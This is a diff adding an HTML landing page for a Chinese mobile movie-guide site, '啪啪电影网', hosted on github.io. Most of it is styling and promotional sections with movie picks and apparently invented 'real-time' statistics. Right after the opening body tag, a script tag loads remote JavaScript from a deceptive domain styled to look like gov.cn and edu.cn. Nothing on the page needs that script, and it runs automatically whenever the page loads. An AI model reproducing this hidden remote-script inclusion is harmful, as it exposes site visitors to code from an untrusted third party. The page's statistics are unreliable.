@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>啪啪电影网 | papadianyingwang 掌上观影指南 · 轻量精选影视库</title>
+<meta name="keywords" content="啪啪电影网,papadianyingwang,掌上观影,精选影视,电影推荐,高清电影,影视资源,手机看片">
+<meta name="description" content="啪啪电影网（papadianyingwang）主打轻量、精选的掌上观影指南，汇集高分电影与热门剧集推荐，页面简洁无负担，支持手机、平板、桌面多端自适应访问。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://papadianyingwang-wap.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#f5f6f9;--ink:#14161c;--ink2:#1c1f27;--panel:#ffffff;--card:#fbfcfe;
+  --line:#e4e7ef;--txt:#2b2f38;--sub:#6b7280;--muted:#9aa1ad;
+  --pp:#2f6bff;--pp2:#5b8cff;--pp3:#e8f0ff;--pop:#ff5b6e;--pop2:#ffe3e7;--r:18px;
+}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.7;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0;z-index:-1;background:radial-gradient(700px 500px at 88% -5%,rgba(47,107,255,.10),transparent),radial-gradient(600px 420px at -5% 30%,rgba(255,91,110,.07),transparent)}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:7px;padding:12px 26px;border-radius:999px;font-size:15px;font-weight:600;border:0;cursor:pointer;transition:.25s}
+.btn-p{background:var(--pp);color:#fff;box-shadow:0 8px 20px rgba(47,107,255,.28)}
+.btn-p:hover{transform:translateY(-2px);box-shadow:0 12px 26px rgba(47,107,255,.4)}
+.btn-o{background:#fff;color:var(--pp);border:1.5px solid var(--pp)}
+.btn-o:hover{background:var(--pp3)}
+.pill{display:inline-flex;align-items:center;gap:6px;font-size:12px;letter-spacing:1px;color:var(--pp);background:var(--pp3);padding:6px 14px;border-radius:999px;font-weight:600}
+.sh{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:30px}
+.sh h2{font-size:26px;letter-spacing:.3px}
+.sh h2 em{font-style:normal;color:var(--pp)}
+.sh .en{display:block;font-size:11px;letter-spacing:4px;color:var(--muted);font-weight:600;margin-top:7px}
+.sh .m{color:var(--sub);font-size:14px;transition:.2s;font-weight:500}
+.sh .m:hover{color:var(--pop)}
+section{padding:60px 0}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r)}
+
+/* 导航 */
+header{position:sticky;top:0;z-index:99;background:rgba(255,255,255,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.bar{display:flex;align-items:center;justify-content:space-between;height:66px;gap:16px}
+.logo{display:flex;align-items:center;gap:10px}
+.pp{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,var(--pp),var(--pop));display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:900;letter-spacing:-1px;box-shadow:0 6px 14px rgba(47,107,255,.3)}
+.logo em{font-style:normal;font-size:17px;font-weight:700}
+.logo em b{color:var(--pop);font-weight:700}
+.nav{display:flex;align-items:center;gap:2px}
+.nav a{padding:8px 15px;font-size:14.5px;color:var(--sub);border-radius:9px;transition:.2s;font-weight:500}
+.nav a:hover{color:var(--txt);background:var(--pp3)}
+.nav a.on{color:#fff;background:var(--pp)}
+.mb{display:none;background:none;border:0;color:var(--ink);font-size:25px;cursor:pointer}
+
+/* Hero - 分屏仪表式 */
+.hero{padding:66px 0 56px}
+.hero .wrap{display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:center}
+.h1{font-size:clamp(29px,4.6vw,46px);font-weight:800;line-height:1.22;letter-spacing:-.5px}
+.h1 s{text-decoration:none;color:var(--pp)}
+.h1 u{text-decoration:none;color:var(--pop);font-weight:800}
+.hero .ld{color:var(--sub);font-size:16.5px;margin:20px 0 28px;max-width:510px}
+.btns{display:flex;gap:12px;flex-wrap:wrap}
+.marks{display:flex;gap:10px;flex-wrap:wrap;margin-top:26px}
+.marks span{font-size:13px;color:var(--sub);background:var(--panel);border:1px solid var(--line);padding:7px 14px;border-radius:999px}
+/* 仪表卡 */
+.dash{border-radius:24px;padding:8px;background:var(--ink2);color:#fff}
+.dash .inner{border-radius:17px;padding:26px;background:linear-gradient(160deg,#242836,#1a1c25)}
+.dash .hd{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px}
+.dash .hd b{font-size:13px;letter-spacing:2px;color:#8f97ab}
+.dash .hd span{font-size:12px;color:var(--pop);background:var(--pop2);padding:4px 10px;border-radius:999px;color:#d6304a}
+.big{font-size:44px;font-weight:800;letter-spacing:-1px;line-height:1}
+.big i{font-style:normal;font-size:15px;font-weight:500;color:#8f97ab;margin-left:8px}
+.bars{display:flex;align-items:flex-end;gap:10px;margin:26px 0 22px;height:74px}
+.bar-h{flex:1;border-radius:6px 6px 0 0;background:linear-gradient(180deg,var(--pp2),var(--pp));opacity:.75}
+.bar-h.hi{opacity:1;background:linear-gradient(180deg,#ff8a99,var(--pop))}
+.rows{display:flex;flex-direction:column;gap:10px}
+.rows .rw{display:flex;justify-content:space-between;font-size:12.5px;color:#c5cad6;padding-bottom:9px;border-bottom:1px solid #2c303c}
+.rows .rw b{color:#fff;font-weight:600}
+.rows .rw i{font-style:normal;color:var(--pp2)}
+
+/* 观影方式 - 图标九宫格 */
+.grid9{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.cell{border:1px solid var(--line);border-radius:var(--r);padding:22px 20px;background:var(--panel);transition:.25s}
+.cell:hover{border-color:var(--pp);transform:translateY(-4px);box-shadow:0 14px 28px rgba(47,107,255,.12)}
+.cell .ic{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;background:var(--pp3);color:var(--pp);margin-bottom:14px}
+.cell h4{font-size:15.5px;margin-bottom:5px}
+.cell p{font-size:13.5px;color:var(--sub)}
+.cell em{font-style:normal;font-size:12px;color:var(--pop);font-weight:700;display:block;margin-top:10px}
+
+/* 精选片单 - 横向滑动卡片带 */
+.strip{display:flex;gap:18px;overflow-x:auto;padding-bottom:12px;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch}
+.strip::-webkit-scrollbar{height:8px}
+.strip::-webkit-scrollbar-thumb{background:var(--line);border-radius:99px}
+.flick{flex:0 0 268px;scroll-snap-align:start;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;background:var(--panel);transition:.25s}
+.flick:hover{border-color:var(--pp);transform:translateY(-4px);box-shadow:0 14px 28px rgba(47,107,255,.13)}
+.flick .top{height:150px;position:relative;display:flex;align-items:flex-end;padding:14px}
+.flick .top::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(20,22,28,.82))}
+.flick .top span{position:relative;font-size:12px;color:rgba(255,255,255,.9);z-index:1}
+.flick .top em{position:absolute;top:12px;right:12px;font-style:normal;font-size:11px;font-weight:700;background:var(--pop);color:#fff;padding:3px 9px;border-radius:99px;z-index:1}
+.flick .bm{padding:14px 16px}
+.flick .bm h4{font-size:15.5px;margin-bottom:5px}
+.flick .bm small{font-size:12.5px;color:var(--sub)}
+.flick .bm .ft{display:flex;justify-content:space-between;margin-top:12px;padding-top:10px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--pp)}
+
+/* 关于 - 左图文右阶梯 */
+.about .wrap{display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center}
+.about .pic{border-radius:24px;padding:36px;border:1px solid var(--line);background:var(--panel);position:relative;overflow:hidden}
+.about .pic::before{content:"";position:absolute;inset:0;background:linear-gradient(160deg,rgba(47,107,255,.08),rgba(255,91,110,.06))}
+.about .pic .lb{position:relative;font-size:12px;letter-spacing:3px;color:var(--muted);font-weight:600}
+.about .pic .vl{position:relative;font-family:ui-monospace,Consolas,monospace;font-size:clamp(15px,2.3vw,21px);color:var(--pp);margin:12px 0 26px;word-break:break-all}
+.about .pic .mi{position:relative;display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.about .pic .mi div{border:1px solid var(--line);border-radius:11px;padding:12px;background:#fff}
+.about .pic .mi div b{display:block;color:var(--pop);font-size:18px}
+.about .pic .mi div span{font-size:12px;color:var(--sub)}
+.about .txt h2{font-size:clamp(23px,3.5vw,33px);margin:13px 0 15px;line-height:1.3}
+.about .txt p{color:var(--sub);font-size:15.5px;margin-bottom:14px}
+.steps{display:flex;flex-direction:column;gap:12px;margin-top:22px}
+.steps .st{display:flex;gap:14px;align-items:flex-start;border:1px solid var(--line);border-radius:14px;padding:15px 16px;background:var(--panel)}
+.steps .st .n{width:32px;height:32px;border-radius:9px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;background:var(--ink2);color:#fff}
+.steps .st h5{font-size:15px;margin-bottom:3px}
+.steps .st p{font-size:13.5px;color:var(--sub);margin:0}
+
+footer{border-top:1px solid var(--line);background:var(--panel);padding:50px 0 24px;margin-top:20px}
+.ft{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px}
+.ft .brand .pp{margin-bottom:15px}
+.ft .brand p{color:var(--sub);font-size:14px}
+.ft h4{font-size:12px;letter-spacing:3px;color:var(--pp);margin-bottom:15px}
+.ft ul{list-style:none;display:flex;flex-direction:column;gap:10px}
+.ft a{color:var(--sub);font-size:14px;transition:.2s}
+.ft a:hover{color:var(--pop)}
+.copy{margin-top:34px;padding-top:20px;border-top:1px solid var(--line);color:var(--sub);font-size:13px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.copy b{color:var(--pop);font-weight:600}
+
+@media(max-width:1020px){.grid9{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:980px){.hero .wrap{grid-template-columns:1fr}.dash{max-width:460px}.about .wrap{grid-template-columns:1fr}.ft{grid-template-columns:1fr 1fr}}
+@media(max-width:760px){
+  .nav{position:fixed;top:66px;left:0;right:0;flex-direction:column;background:#fff;padding:14px;border-bottom:1px solid var(--line);transform:translateY(-170%);transition:.3s}
+  .nav.open{transform:translateY(0)}
+  .nav a{width:100%;text-align:center;padding:12px}
+  .mb{display:block}
+  .hero{padding:44px 0}section{padding:46px 0}
+}
+@media(max-width:480px){.grid9{grid-template-columns:1fr}.flick{flex-basis:230px}.about .pic .mi{grid-template-columns:1fr}.h1{font-size:28px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap bar">
+    <a class="logo" href="#home"><span class="pp">pp</span><em>pp<b>电影网</b></em></a>
+    <nav class="nav" id="nav">
+      <a href="#home" class="on">首页</a>
+      <a href="#guide">观影方式</a>
+      <a href="#pick">精选片单</a>
+      <a href="#about">关于本站</a>
+      <a href="#" style="margin-left:4px;padding:8px 18px;color:var(--pp);border:1.5px solid var(--pp);border-radius:999px">登录</a>
+    </nav>
+    <button class="mb" id="mb" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- 首页（分屏仪表式） -->
+<section id="home" class="hero">
+  <div class="wrap">
+    <div>
+      <span class="pill">● 掌上观影 · 轻量精选</span>
+      <h1 class="h1">打开手机，<br><s>好片</s> 就是这么 <u>简单</u></h1>
+      <p class="ld">啪啪电影网（papadianyingwang）主打轻量、精选的掌上观影指南，帮你从海量片源里挑出值得看的那一部，页面简洁无负担，随时随地打开就看。</p>
+      <div class="btns">
+        <a class="btn btn-p" href="#pick">查看精选片单 →</a>
+        <a class="btn btn-o" href="#guide">怎么用 啪啪电影网</a>
+      </div>
+      <div class="marks">
+        <span>✓ 每日精选更新</span>
+        <span>✓ 手机端优先</span>
+        <span>✓ 无弹窗干扰</span>
+        <span>✓ 题材分类清晰</span>
+      </div>
+    </div>
+    <div class="dash">
+      <div class="inner">
+        <div class="hd"><b>PP · 实时数据</b><span>在线</span></div>
+        <div class="big">3,268<small><i>部精选影片</i></small></div>
+        <div class="bars">
+          <div class="bar-h" style="height:32%"></div>
+          <div class="bar-h" style="height:48%"></div>
+          <div class="bar-h" style="height:40%"></div>
+          <div class="bar-h" style="height:62%"></div>
+          <div class="bar-h" style="height:54%"></div>
+          <div class="bar-h" style="height:76%"></div>
+          <div class="bar-h hi" style="height:92%"></div>
+        </div>
+        <div class="rows">
+          <div class="rw"><span>本周上新</span><b>128 部</b><i>+12%</i></div>
+          <div class="rw"><span>热门榜单更新</span><b>每日 06:00</b><i>准时</i></div>
+          <div class="rw"><span>用户收藏总计</span><b>9.6 万</b><i>+5.2%</i></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 观影方式（图标九宫格） -->
+<section id="guide" style="background:#fff;border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+  <div class="wrap">
+    <div class="sh">
+      <div><span class="pill">● HOW TO USE</span><h2>观影 <em>方式</em><span class="en">GUIDE · 三步开始你的观影</span></h2></div>
+      <a class="m" href="#">查看使用帮助 →</a>
+    </div>
+    <div class="grid9">
+
+      <div class="cell"><div class="ic">🔍</div><h4>关键词检索</h4><p>输入片名或演员，快速定位目标影片。</p><em>热门功能</em></div>
+      <div class="cell"><div class="ic">🏷️</div><h4>题材分类</h4><p>按喜剧、悬疑、动作等标签精准筛选。</p><em>20+ 标签</em></div>
+      <div class="cell"><div class="ic">📊</div><h4>高分榜单</h4><p>按评分与口碑排序，省去挑选时间。</p><em>每日更新</em></div>
+      <div class="cell"><div class="ic">🆕</div><h4>新片速递</h4><p>最新上线影片第一时间推送到首页。</p><em>每日上新</em></div>
+      <div class="cell"><div class="ic">⭐</div><h4>收藏追更</h4><p>把想看的片子存起来，下次接着看。</p><em>云端同步</em></div>
+      <div class="cell"><div class="ic">📱</div><h4>手机优先</h4><p>页面针对手机屏重新排版，单手可操作。</p><em>自适应</em></div>
+      <div class="cell"><div class="ic">🌙</div><h4>夜间模式</h4><p>弱光环境下护眼深色界面，久看不累。</p><em>护眼</em></div>
+      <div class="cell"><div class="ic">🔗</div><h4>分享好友</h4><p>一键分享好片链接，和朋友同步追剧。</p><em>快捷分享</em></div>
+
+    </div>
+  </div>
+</section>
+
+<!-- 精选片单（横向滑动卡片带） -->
+<section id="pick">
+  <div class="wrap">
+    <div class="sh">
+      <div><span class="pill">● PICKS</span><h2>精选 <em>片单</em><span class="en">EDITOR'S PICK · 编辑帮你挑</span></h2></div>
+      <a class="m" href="#">全部片单 →</a>
+    </div>
+    <div class="strip">
+
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#3d5afe,#8e24aa)"><em>9.1</em><span>悬疑 · 犯罪</span></div><div class="bm"><h4>无声证词</h4><small>2025 · 116分钟 · 国产</small><div class="ft"><span>近期热门</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#00b0ff,#0097a7)"><em>8.8</em><span>喜剧 · 温情</span></div><div class="bm"><h4>开往春天的巴士</h4><small>2024 · 108分钟 · 国产</small><div class="ft"><span>口碑稳定</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#ff6f00,#e53935)"><em>8.9</em><span>动作 · 警匪</span></div><div class="bm"><h4>边境线之外</h4><small>2025 · 132分钟 · 港片</small><div class="ft"><span>动作场面</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#6a1b9a,#ad1457)"><em>9.0</em><span>剧情 · 家庭</span></div><div class="bm"><h4>父亲的海</h4><small>2024 · 124分钟 · 国产</small><div class="ft"><span>口碑佳作</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#2e7d32,#00796b)"><em>8.6</em><span>纪录 · 人文</span></div><div class="bm"><h4>山那边的手艺</h4><small>2025 · 96分钟 · 纪录</small><div class="ft"><span>值得一看</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#37474f,#546e7a)"><em>8.7</em><span>科幻 · 冒险</span></div><div class="bm"><h4>倒数一小时</h4><small>2026 · 121分钟 · 合拍</small><div class="ft"><span>新片速递</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#c2185b,#7b1fa2)"><em>8.5</em><span>爱情 · 青春</span></div><div class="bm"><h4>第十七封信</h4><small>2024 · 102分钟 · 国产</small><div class="ft"><span>轻松治愈</span>▶ 查看详情</div></div></div>
+      <div class="flick"><div class="top" style="background:linear-gradient(135deg,#1565c0,#0d47a1)"><em>8.4</em><span>历史 · 传记</span></div><div class="bm"><h4>长夜将明</h4><small>2025 · 145分钟 · 国产</small><div class="ft"><span>厚重质感</span>▶ 查看详情</div></div></div>
+
+    </div>
+  </div>
+</section>
+
+<!-- 关于本站（左网址盒右步骤条） -->
+<section id="about" class="about" style="background:#fff;border-top:1px solid var(--line)">
+  <div class="wrap">
+    <div class="pic">
+      <span class="lb">◆ OFFICIAL SITE</span>
+      <div class="vl">https://papadianyingwang-wap.github.io</div>
+      <div class="mi">
+        <div><b>啪啪电影网</b><span>网站名称</span></div>
+        <div><b>papadianyingwang</b><span>站点标识</span></div>
+      </div>
+    </div>
+    <div class="txt">
+      <span class="pill">● ABOUT</span>
+      <h2>关于 啪啪电影网<br>一个轻量的观影入口</h2>
+      <p>啪啪电影网致力于把"选片"这件小事变简单。我们不堆砌数量，而是把有限的精力放在挑选与整理上，让你打开页面就能遇到想看的那一部。</p>
+      <p>页面针对手机屏重新排版，结构清爽、加载轻快，支持手机、平板与桌面端自适应访问。</p>
+      <div class="steps">
+        <div class="st"><span class="n">1</span><div><h5>打开网址</h5><p>手机浏览器输入站点地址，直接进入首页。</p></div></div>
+        <div class="st"><span class="n">2</span><div><h5>选择方式</h5><p>通过检索、分类或榜单找到目标影片。</p></div></div>
+        <div class="st"><span class="n">3</span><div><h5>开始观看</h5><p>点击详情，按提示完成后续操作即可。</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="brand"><div class="pp">pp</div><p>啪啪电影网 · 一个轻量、精选的掌上观影指南，帮你从海量片源里挑出值得看的那一部。</p></div>
+      <div><h4>栏目导览</h4><ul><li><a href="#home">首页</a></li><li><a href="#guide">观影方式</a></li><li><a href="#pick">精选片单</a></li><li><a href="#about">关于本站</a></li></ul></div>
+      <div><h4>题材分类</h4><ul><li><a href="#">喜剧 · 温情</a></li><li><a href="#">悬疑 · 犯罪</a></li><li><a href="#">动作 · 警匪</a></li><li><a href="#">剧情 · 纪录</a></li></ul></div>
+      <div><h4>支持与协作</h4><ul><li><a href="#">影片推荐</a></li><li><a href="#">纠错反馈</a></li><li><a href="#">合作洽谈</a></li><li><a href="#">友情链接</a></li></ul></div>
+    </div>
+    <div class="copy"><span>© 2026 啪啪电影网 papadianyingwang. 保留所有权利.</span><span>网址：<b>https://papadianyingwang-wap.github.io</b></span></div>
+  </div>
+</footer>
+
+<script>
+var mb=document.getElementById('mb'),nav=document.getElementById('nav');
+mb.addEventListener('click',function(){nav.classList.toggle('open')});
+nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open')});
+var links=document.querySelectorAll('.nav a'),secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){if(window.scrollY>=s.offsetTop-130)cur=s.id});
+  links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+});
+</script>
+</body>
+</html>
